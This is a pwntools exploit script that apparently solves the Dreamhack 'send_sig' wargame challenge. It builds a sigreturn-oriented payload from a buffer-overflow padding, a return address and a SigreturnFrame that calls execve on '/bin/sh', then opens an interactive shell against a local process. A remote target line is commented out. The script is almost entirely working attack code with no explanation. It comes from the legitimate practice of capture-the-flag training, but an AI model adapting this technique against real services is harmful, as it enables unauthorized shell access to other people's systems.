from pwn import *

# port = 20482
# rem = remote("host3.dreamhack.games", port)
rem = process("./Pwnable/send_sig/problem/send_sig")

context.arch = 'x86_64'
elf = ELF("./Pwnable/send_sig/problem/send_sig")

syscall = next(elf.search(asm("syscall")))
binsh = next(elf.search(b"/bin/sh"))
bss = elf.bss()
ret2_addr = 0x4010ae

frame = SigreturnFrame()
frame.rip = syscall
frame.rax = 0x3b
frame.rdi = binsh
# frame.rsp = bss + 0x50

payload = b'A' * 8
payload += b'B' * 8
payload += p64(ret2_addr)
# payload += p64(15)
payload += bytes(frame)

rem.sendlineafter(b"Signal:", payload)

rem.interactive()